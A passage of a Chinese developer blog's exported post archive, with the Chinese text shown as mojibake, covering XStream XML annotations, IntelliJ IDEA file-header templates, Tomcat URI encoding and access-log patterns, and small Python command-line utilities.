<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">type</span>&gt;</span>12<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">part</span>&gt;</span>first content<span class="tag">&lt;/<span class="name">part</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">part</span>&gt;</span>second content<span class="tag">&lt;/<span class="name">part</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">important</span>&gt;</span>false<span class="tag">&lt;/<span class="name">important</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">created</span>&gt;</span>1482856467282<span class="tag">&lt;/<span class="name">created</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>å±æ€§</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@XStreamAlias</span>(<span class="string">"type"</span>)</span><br><span class="line"><span class="meta">@XStreamAsAttribute</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> messageType;</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºç»“æœ</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span> <span class="attr">type</span>=<span class="string">"12"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">part</span>&gt;</span>first content<span class="tag">&lt;/<span class="name">part</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">part</span>&gt;</span>second content<span class="tag">&lt;/<span class="name">part</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">important</span>&gt;</span>false<span class="tag">&lt;/<span class="name">important</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">created</span>&gt;</span>1482856554517<span class="tag">&lt;/<span class="name">created</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>å¿½ç•¥ä¸€äº›å­—æ®µ</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span> <span class="attr">type</span>=<span class="string">"12"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">part</span>&gt;</span>first content<span class="tag">&lt;/<span class="name">part</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">part</span>&gt;</span>second content<span class="tag">&lt;/<span class="name">part</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">created</span>&gt;</span>1482856661757<span class="tag">&lt;/<span class="name">created</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>important</code> å±æ€§å·²ç»è¢«éšè—</p>
<h4 id="è‡ªåŠ¨æ‰«ææ³¨è§£"><a href="#è‡ªåŠ¨æ‰«ææ³¨è§£" class="headerlink" title="è‡ªåŠ¨æ‰«ææ³¨è§£"></a>è‡ªåŠ¨æ‰«ææ³¨è§£</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xStream.autodetectAnnotations(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
<h2 id="xmlè½¬å¯¹è±¡"><a href="#xmlè½¬å¯¹è±¡" class="headerlink" title="xmlè½¬å¯¹è±¡"></a>xmlè½¬å¯¹è±¡</h2> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RendezvousMessage deserializedMessage = (RendezvousMessage) xStream.fromXML(<span class="string">"&lt;message type=\"12\"&gt;\n"</span> +</span><br><span class="line">        <span class="string">"  &lt;part&gt;first content&lt;/part&gt;\n"</span> +</span><br><span class="line">        <span class="string">"  &lt;part&gt;second content&lt;/part&gt;\n"</span> +</span><br><span class="line">        <span class="string">"  &lt;created&gt;1482859234272&lt;/created&gt;\n"</span> +</span><br><span class="line">        <span class="string">"&lt;/message&gt;"</span>);</span><br></pre></td></tr></table></figure>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ol>
<li><p><a href="http://x-stream.github.io/index.html" rel="external nofollow noopener noreferrer" target="_blank">About XStream</a></p>
</li>
<li><p><a href="http://x-stream.github.io/alias-tutorial.html" rel="external nofollow noopener noreferrer" target="_blank">Alias Tutorial</a></p>
</li>
<li><p><a href="http://x-stream.github.io/annotations-tutorial.html" rel="external nofollow noopener noreferrer" target="_blank">Annotations Tutorial</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> xml </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ideaæ–‡ä»¶æ¨¡æ¿]]></title>
      <url>http://qsli.github.io/2016/12/23/idea-template/</url>
      <content type="html"><![CDATA[<h1 id="ç‰ˆæƒä¿¡æ¯"><a href="#ç‰ˆæƒä¿¡æ¯" class="headerlink" title="ç‰ˆæƒä¿¡æ¯"></a>ç‰ˆæƒä¿¡æ¯</h1><p>ä»£ç å‰é¢ä¸€èˆ¬éƒ½ä¼šæœ‰ç›¸åº”çš„ç‰ˆæƒä¿¡æ¯ï¼Œæ‹¿guavaçš„ä»£ç ä¸ºä¾‹</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (C) 2007 The Guava Authors</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Licensed under the Apache License, Version 2.0 (the "License");</span></span><br><span class="line"><span class="comment"> * you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment"> * You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment"> * distributed under the License is distributed on an "AS IS" BASIS,</span></span><br><span class="line"><span class="comment"> * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment"> * See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment"> * limitations under the License.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.google.common.collect;</span><br></pre></td></tr></table></figure>
<h2 id="ideaè‡ªåŠ¨ç”Ÿæˆç‰ˆæƒä¿¡æ¯"><a href="#ideaè‡ªåŠ¨ç”Ÿæˆç‰ˆæƒä¿¡æ¯" class="headerlink" title="ideaè‡ªåŠ¨ç”Ÿæˆç‰ˆæƒä¿¡æ¯"></a>ideaè‡ªåŠ¨ç”Ÿæˆç‰ˆæƒä¿¡æ¯</h2><p><code>File</code> &gt; <code>Settings</code> &gt; <code>Copyright</code> &gt; <code>Copyright Profiles</code></p>
<p>æ–°å»ºä¸€ä¸ªprofileï¼Œå¡«å…¥å¦‚ä¸‹çš„å†…å®¹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/* * Copyright (c) $today.year xx.com. All Rights Reserved. */</span><br></pre></td></tr></table></figure></p>
<p><code>$today.year</code>ä»£è¡¨å½“å‰çš„å¹´</p>
<img src="/2016/12/23/idea-template/profiles.jpg">
<p>æ–°å»ºjavaæ–‡ä»¶æ—¶å°±è‡ªåŠ¨ç”Ÿæˆäº†ç‰ˆæƒä¿¡æ¯ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  * Copyright (c) 2016 Qunar.com. All Rights Reserved. </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.xxx.handler;</span><br></pre></td></tr></table></figure>
<h1 id="ä½œè€…ã€æ—¥æœŸã€é‚®ç®±ç­‰"><a href="#ä½œè€…ã€æ—¥æœŸã€é‚®ç®±ç­‰" class="headerlink" title="ä½œè€…ã€æ—¥æœŸã€é‚®ç®±ç­‰"></a>ä½œè€…ã€æ—¥æœŸã€é‚®ç®±ç­‰</h1><p><code>File</code> &gt; <code>Settings</code> &gt; <code>File and Ocde Templates</code> &gt; <code>Includes</code> &gt; <code>File Header</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#set( $email = "xx@xx.com")</span><br><span class="line">#set( $author = "xxx")</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> $&#123;author&#125;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span> $&#123;email&#125;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> $&#123;DATE&#125; $&#123;TIME&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªä½¿ç”¨çš„<code>velocity</code>æ¸²æŸ“çš„ï¼Œå¯ä»¥å‚è€ƒ<code>velocity</code>çš„è¯­æ³•</p>
]]></content>
      
        <categories>
            
            <category> idea </category>
            
        </categories>
        
        
        <tags>
            
            <tag> template </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[tomcatä¸­æ–‡ç¼–ç è®¾ç½®]]></title>
      <url>http://qsli.github.io/2016/12/23/tomcat-encoding/</url>
      <content type="html"><![CDATA[<h2 id="tomcatä¸­æ–‡ä¹±ç "><a href="#tomcatä¸­æ–‡ä¹±ç " class="headerlink" title="tomcatä¸­æ–‡ä¹±ç "></a>tomcatä¸­æ–‡ä¹±ç </h2><p>tomcat é»˜è®¤çš„ç¼–<code>ISO-8859-1</code>ç¼–ç ï¼Œéƒ¨åˆ†ä¸­æ–‡ä¼šå‡ºç°ä¹±ç </p>
<blockquote>
<p><em>URIEncoding</em><br>This specifies the character encoding used to decode the URI bytes, after %xx decoding the URL. If not specified, ISO-8859-1 will be used.</p>
</blockquote>
<h2 id="ç¼–ç è®¾ç½®"><a href="#ç¼–ç è®¾ç½®" class="headerlink" title="ç¼–ç è®¾ç½®"></a>ç¼–ç è®¾ç½®</h2><p><code>conf/server.xml</code></p>
<p>ä¿®æ”¹å‰ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">"8080"</span> <span class="attr">redirectPort</span>=<span class="string">"8443"</span> <span class="attr">connectionTimeout</span>=<span class="string">"20000"</span> <span class="attr">protocol</span>=<span class="string">"HTTP/1.1"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹åï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">"8080"</span> <span class="attr">redirectPort</span>=<span class="string">"8443"</span> <span class="attr">connectionTimeout</span>=<span class="string">"20000"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">protocol</span>=<span class="string">"HTTP/1.1"</span>               </span></span><br><span class="line"><span class="tag"><span class="attr">URIEncoding</span>=<span class="string">"UTF-8"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><a href="https://tomcat.apache.org/tomcat-7.0-doc/config/http.html" rel="external nofollow noopener noreferrer" target="_blank">The HTTP Connector</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> tomcat </category>
            
        </categories>
        
        
        <tags>
            
            <tag> encoding </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[tomcat access log æ ¼å¼è®¾ç½®]]></title>
      <url>http://qsli.github.io/2016/12/23/tomcat-access-log/</url>
      <content type="html"><![CDATA[<h2 id="Tomcat-access-log-æ—¥å¿—æ ¼å¼"><a href="#Tomcat-access-log-æ—¥å¿—æ ¼å¼" class="headerlink" title="Tomcat access log æ—¥å¿—æ ¼å¼"></a>Tomcat access log æ—¥å¿—æ ¼å¼</h2><p>æ–‡ä»¶ä½ç½®: <code>conf/server.xml</code></p>
<p>é»˜è®¤é…ç½®</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Access log processes all example.</span></span><br><span class="line"><span class="comment">     Documentation at: /docs/config/valve.html</span></span><br><span class="line"><span class="comment">     <span class="doctag">Note:</span> The pattern used is equivalent to using pattern="common" --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Valve</span> <span class="attr">className</span>=<span class="string">"org.apache.catalina.valves.AccessLogValve"</span> <span class="attr">directory</span>=<span class="string">"logs"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">prefix</span>=<span class="string">"localhost_access_log."</span> <span class="attr">suffix</span>=<span class="string">".txt"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">pattern</span>=<span class="string">"%h %l %u %t <span class="symbol">&amp;quot;</span>%r<span class="symbol">&amp;quot;</span> %s %b"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>åç§°</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>%a</td>
<td>Remote IP address</td>
</tr>
<tr>
<td>%A</td>
<td>Local IP address</td>
</tr>
<tr>
<td>%b</td>
<td>Bytes sent, excluding HTTP headers, or â€˜-â€˜ if zero</td>
</tr>
<tr>
<td>%B</td>
<td>Bytes sent, excluding HTTP headers</td>
</tr>
<tr>
<td>%h</td>
<td>Remote host name (or IP address if enableLookups for the connector is false)</td>
</tr>
<tr>
<td>%H</td>
<td>Request protocol</td>
</tr>
<tr>
<td>%l</td>
<td>Remote logical username from identd (always returns â€˜-â€˜)</td>
</tr>
<tr>
<td>%m</td>
<td>Request method (GET, POST, etc.)</td>
</tr>
<tr>
<td>%p</td>
<td>Local port on which this request was received</td>
</tr>
<tr>
<td>%q</td>
<td>Query string (prepended with a â€˜?â€™ if it exists)</td>
</tr>
<tr>
<td>%r</td>
<td>First line of the request (method and request URI)</td>
</tr>
<tr>
<td>%s</td>
<td>HTTP status code of the response</td>
</tr>
<tr>
<td>%S</td>
<td>User session ID</td>
</tr>
<tr>
<td>%t</td>
<td>Date and time, in Common Log Format</td>
</tr>
<tr>
<td>%u</td>
<td>Remote user that was authenticated (if any), else â€˜-â€˜</td>
</tr>
<tr>
<td>%U</td>
<td>Requested URL path</td>
</tr>
<tr>
<td>%v</td>
<td>Local server name</td>
</tr>
<tr>
<td>%D</td>
<td>Time taken to process the request, in millis</td>
</tr>
<tr>
<td>%T</td>
<td>Time taken to process the request, in seconds</td>
</tr>
<tr>
<td>%F</td>
<td>Time taken to commit the response, in millis</td>
</tr>
<tr>
<td>%I</td>
<td>Current request thread name (can compare later with stacktraces)</td>
</tr>
</tbody>
</table>
<p>é»˜è®¤çš„é…ç½®æ‰“å‡ºæ¥çš„accessæ—¥å¿—å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>127.0.0.1</td>
<td>-</td>
<td>-</td>
<td>[07/Oct/2016:22:31:56 +0800]</td>
<td>â€œGET /dubbo/ HTTP/1.1â€</td>
<td>404</td>
<td>963</td>
</tr>
<tr>
<td>è¿œç¨‹IP</td>
<td>logical username</td>
<td>remote user</td>
<td>æ—¶é—´å’Œæ—¥æœŸ</td>
<td>httpè¯·æ±‚çš„ç¬¬ä¸€è¡Œ</td>
<td>çŠ¶æ€ç </td>
<td>é™¤å»httpå¤´çš„å‘é€å¤§å°</td>
</tr>
</tbody>
</table>
<h3 id="headerã€cookieã€sessionå…¶ä»–å­—æ®µçš„æ”¯æŒ"><a href="#headerã€cookieã€sessionå…¶ä»–å­—æ®µçš„æ”¯æŒ" class="headerlink" title="headerã€cookieã€sessionå…¶ä»–å­—æ®µçš„æ”¯æŒ"></a>headerã€cookieã€sessionå…¶ä»–å­—æ®µçš„æ”¯æŒ</h3><blockquote>
<p>There is also support to write information incoming or outgoing headers, cookies, session or request attributes and special timestamp formats. It is modeled after the Apache HTTP Server log configuration syntax:</p>
</blockquote>
<table>
<thead>
<tr>
<th>åç§°</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>%{xxx}i</td>
<td>for incoming headers</td>
</tr>
<tr>
<td>%{xxx}o</td>
<td>for outgoing response headers</td>
</tr>
<tr>
<td>%{xxx}c</td>
<td>for a specific cookie</td>
</tr>
<tr>
<td>%{xxx}r</td>
<td>xxx is an attribute in the ServletRequest</td>
</tr>
<tr>
<td>%{xxx}s</td>
<td>xxx is an attribute in the HttpSession</td>
</tr>
<tr>
<td>%{xxx}t</td>
<td>xxx is an enhanced SimpleDateFormat pattern</td>
</tr>
</tbody>
</table>
<p>ä¾‹å¦‚ï¼š <code>%{X-Forwarded-For}i</code>å³å¯æ‰“å°å‡ºå®é™…è®¿é—®çš„ipåœ°å€ï¼ˆè€ƒè™‘åˆ°ngçš„åå‘ä»£ç†ï¼‰</p>
<p>HTTPå¤´ä¸€èˆ¬æ ¼å¼å¦‚ä¸‹:</p>
<p><code>X-Forwarded-For: client1, proxy1, proxy2</code></p>
<blockquote>
<p>å…¶ä¸­çš„å€¼é€šè¿‡ä¸€ä¸ª é€—å·+ç©ºæ ¼ æŠŠå¤šä¸ªIPåœ°å€åŒºåˆ†å¼€, æœ€å·¦è¾¹ï¼ˆclient1ï¼‰æ˜¯æœ€åŸå§‹å®¢æˆ·ç«¯çš„IPåœ°å€, ä»£ç†æœåŠ¡å™¨æ¯æˆåŠŸæ”¶åˆ°ä¸€ä¸ªè¯·æ±‚ï¼Œå°±æŠŠè¯·æ±‚æ¥æºIPåœ°å€æ·»åŠ åˆ°å³è¾¹ã€‚ åœ¨ä¸Šé¢è¿™ä¸ªä¾‹å­ä¸­ï¼Œè¿™ä¸ªè¯·æ±‚æˆåŠŸé€šè¿‡äº†ä¸‰å°ä»£ç†æœåŠ¡å™¨ï¼šproxy1, proxy2 åŠ proxy3ã€‚è¯·æ±‚ç”±client1å‘å‡ºï¼Œåˆ°è¾¾äº†proxy3ï¼ˆproxy3å¯èƒ½æ˜¯è¯·æ±‚çš„ç»ˆç‚¹ï¼‰ã€‚è¯·æ±‚åˆšä»client1ä¸­å‘å‡ºæ—¶ï¼ŒXFFæ˜¯ç©ºçš„ï¼Œè¯·æ±‚è¢«å‘å¾€proxy1ï¼›é€šè¿‡proxy1çš„æ—¶å€™ï¼Œclient1è¢«æ·»åŠ åˆ°XFFä¸­ï¼Œä¹‹åè¯·æ±‚è¢«å‘å¾€proxy2;é€šè¿‡proxy2çš„æ—¶å€™ï¼Œproxy1è¢«æ·»åŠ åˆ°XFFä¸­ï¼Œä¹‹åè¯·æ±‚è¢«å‘å¾€proxy3ï¼›é€šè¿‡proxy3æ—¶ï¼Œproxy2è¢«æ·»åŠ åˆ°XFFä¸­ï¼Œä¹‹åè¯·æ±‚çš„çš„å»å‘ä¸æ˜ï¼Œå¦‚æœproxy3ä¸æ˜¯è¯·æ±‚ç»ˆç‚¹ï¼Œè¯·æ±‚ä¼šè¢«ç»§ç»­è½¬å‘ã€‚</p>
</blockquote>
<blockquote>
<p>é‰´äºä¼ªé€ è¿™ä¸€å­—æ®µéå¸¸å®¹æ˜“ï¼Œåº”è¯¥è°¨æ…ä½¿ç”¨X-Forwarded-Forå­—æ®µã€‚æ­£å¸¸æƒ…å†µä¸‹XFFä¸­æœ€åä¸€ä¸ªIPåœ°å€æ˜¯æœ€åä¸€ä¸ªä»£ç†æœåŠ¡å™¨çš„IPåœ°å€, è¿™é€šå¸¸æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¯é çš„ä¿¡æ¯æ¥æºã€‚</p>
</blockquote>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><p><a href="http://tomcat.apache.org/tomcat-7.0-doc/config/valve.html" rel="external nofollow noopener noreferrer" target="_blank">The Valve Component</a></p>
</li>
<li><p><a href="https://zh.wikipedia.org/wiki/X-Forwarded-For" rel="external nofollow noopener noreferrer" target="_blank">X-Forwarded-For</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> tomcat </category>
            
        </categories>
        
        
        <tags>
            
            <tag> access-log </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python å°æŠ€å·§]]></title>
      <url>http://qsli.github.io/2016/12/18/python-util/</url>
      <content type="html"><![CDATA[<h2 id="å¼€å¯ä¸€ä¸ªç®€å•çš„HTTP-Server"><a href="#å¼€å¯ä¸€ä¸ªç®€å•çš„HTTP-Server" class="headerlink" title="å¼€å¯ä¸€ä¸ªç®€å•çš„HTTP Server"></a>å¼€å¯ä¸€ä¸ªç®€å•çš„HTTP Server</h2><ul>
<li>å‘½ä»¤ï¼š</li>
</ul>
<p><code>python -m SimpleHTTPServer port</code></p>
<p><code>-m</code> æ˜¯æŒ‡åé¢è·Ÿçš„æ˜¯pythonçš„ä¸€ä¸ªModlue</p>
<p><code>port</code> é»˜è®¤æ˜¯<code>8080</code>ï¼Œå¯ä»¥è‡ªè¡ŒæŒ‡å®šã€‚</p>
<ul>
<li>ä½œç”¨ï¼š</li>
</ul>
<ol>
<li><p>å¯ä»¥å½“ä¸€ä¸ªç®€å•çš„httpserverï¼Œåšæµ‹è¯•ç”¨</p>
</li>
<li><p>å¯ä»¥ç®€å•çš„ä¼ è¾“ä¸€äº›å°æ–‡ä»¶ï¼ˆå¤§æ–‡ä»¶æ€§èƒ½ä¸å¥½ï¼Œç»å¸¸ä¸­æ–­ï¼‰,å¤§æ–‡ä»¶çš„ä¼ è¾“å¯ä»¥ç”¨nc</p>
</li>
</ol>
<p>è§ï¼š <a href="/2016/12/18/nc/" title="netcat(nc) â€”â€” ä½¿ç”¨å°ç»“">netcat(nc) â€”â€” ä½¿ç”¨å°ç»“</a></p>
<h2 id="ç®€å•çš„cig-server"><a href="#ç®€å•çš„cig-server" class="headerlink" title="ç®€å•çš„cig server"></a>ç®€å•çš„cig server</h2><ul>
<li><p>å‘½ä»¤ï¼š<br><code>python -m CGIHTTPServer port</code></p>
</li>
<li><p>ä½œç”¨:</p>
</li>
</ul>
<p>å¯ä»¥å¼€å¯ä¸€ä¸ªç®€å•çš„cgiæœåŠ¡å™¨ï¼Œæ”¯æŒpythonä½œä¸ºcgiçš„è¯­è¨€ï¼Œcgiçš„è„šæœ¬é¡»æ”¾ç½®åœ¨rootç›®å½•ä¸‹çš„<code>cgi-bin</code></p>
<h2 id="æ ¼å¼åŒ–-jsonæ•°æ®"><a href="#æ ¼å¼åŒ–-jsonæ•°æ®" class="headerlink" title="æ ¼å¼åŒ– jsonæ•°æ®"></a>æ ¼å¼åŒ– jsonæ•°æ®</h2><ul>
<li>å‘½ä»¤:</li>
</ul>
<p><code>curl http://my_url/ | python -m json.tool</code></p>
<ul>
<li>ä½œç”¨:</li>
</ul>
<p>åœ¨è¿”å›å¤§é‡jsonæ•°æ®æ—¶ï¼Œåœ¨å‘½ä»¤è¡Œé‡Œå¯ä»¥ç”¨è¿™ä¸ªå·¥å…·è¿›è¡Œæ ¼å¼åŒ–ã€‚</p>
<p>chromeæµè§ˆå™¨ä¸­çš„<code>JsonView</code>æ’ä»¶å¯ä»¥åšåˆ°åŒæ ·çš„äº‹æƒ…<a href="https://chrome.google.com/webstore/detail/json-viewer/aimiinbnnkboelefkjlenlgimcabobli?utm_source=chrome-ntp-icon" rel="external nofollow noopener noreferrer" target="_blank">chromeå•†åº—é“¾æ¥</a></p>
<ul>
<li>ç¼ºé™·ï¼š</li>
</ul>
<p>python 2.x ä¸­æ˜¯ä½¿ç”¨ASCIIç ä½œä¸ºé»˜è®¤ç¼–ç çš„ï¼Œå› æ­¤jsonä¸­å¦‚æœå¸¦æœ‰ä¸­æ–‡å°±åªæ˜¯16è¿›åˆ¶çš„è¡¨ç¤ºï¼Œå¯ä»¥ä¿®æ”¹<code>json.tool</code>çš„æºä»£ç ã€‚</p>
<p>å‚è§<a href="http://axiaoxin.com/article/77/" rel="external nofollow noopener noreferrer" target="_blank">jsonå¤„ç†å°æŠ€å·§</a></p>
<blockquote>
<p>Pythonä¹Ÿæœ‰å‘½ä»¤è¡Œé‡Œé¢æ ¼å¼åŒ–æ˜¾ç¤ºjsonçš„æ¨¡å—json.tool</p>
</blockquote>
<blockquote>
<p>cat data.json<br>{â€œçˆ±â€: â€œæˆ‘â€, â€œä¸­â€: â€œåâ€}<br>cat data.json| python -m json.tool<br>{<br>    â€œ\u4e2dâ€: â€œ\u534eâ€,<br>    â€œ\u7231â€: â€œ\u6211â€<br>}<br>å¥½åƒæœ‰ä»€ä¹ˆä¸å¯¹åŠ²ï¼Ÿå› ä¸ºjson.toolåœ¨å®ç°çš„æ—¶å€™ensure_asciiä¸ºTrueï¼Œè®©æˆ‘ä»¬ç”¨Pythonæ¥è‡ªå·±å®ç°ä¸€ä¸ªæ›´å¥½çš„Unix filterã€‚</p>
</blockquote>
<p><code>filter.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> fileinput</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> fileinput.input():</span><br><span class="line">    print(json.dumps(json.loads(l), ensure_ascii=<span class="literal">False</span>).encode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure>
<p>åªéœ€è¦å†™ä¸Šé¢é‚£ 4 è¡Œä»£ç ï¼Œå°±å¯ä»¥è¿™æ ·ä½¿ç”¨å®ƒï¼š</p>
<blockquote>
<p>python filter.py data.json<br>{â€œçˆ±â€: â€œæˆ‘â€, â€œä¸­â€: â€œåâ€}<br>cat data.json| python filter.py<br>{â€œçˆ±â€: â€œæˆ‘â€, â€œä¸­â€: â€œåâ€}</p>
</blockquote>
<h2 id="ç¼–ç é—®é¢˜"><a href="#ç¼–ç é—®é¢˜" class="headerlink" title="ç¼–ç é—®é¢˜"></a>ç¼–ç é—®é¢˜</h2><p>python 2.x é»˜è®¤ä½¿ç”¨çš„ç¼–ç æ˜¯asciiç¼–ç ï¼Œä¸­æ–‡æ€»æ˜¯å‡ºé—®é¢˜ã€‚</p>
<p>é‡åˆ°ä¹±ç é—®é¢˜ï¼Œä¸€èˆ¬ä½¿ç”¨å¦‚ä¸‹çš„æ­¥éª¤å³å¯è§£å†³:</p>
<ol>
<li>pythonæ–‡ä»¶è‡ªèº«çš„ç¼–ç </li>
</ol>
<blockquote>
<pre><code>Python will default to ASCII as standard encoding if no other
encoding hints are given.
</code></pre></blockquote>
<pre><code>To define a source code encoding, a magic comment must
be placed into the source files either as first or second
line in the file, such as:

      # coding=&lt;encoding name&gt;

or (using formats recognized by popular editors)

      #!/usr/bin/python
      # -*- coding: &lt;encoding name&gt; -*-
</code></pre><p>åœ¨æ–‡ä»¶å¤´åŠ ä¸Šé»˜è®¤ç¼–ç å³å¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<ol start="2">
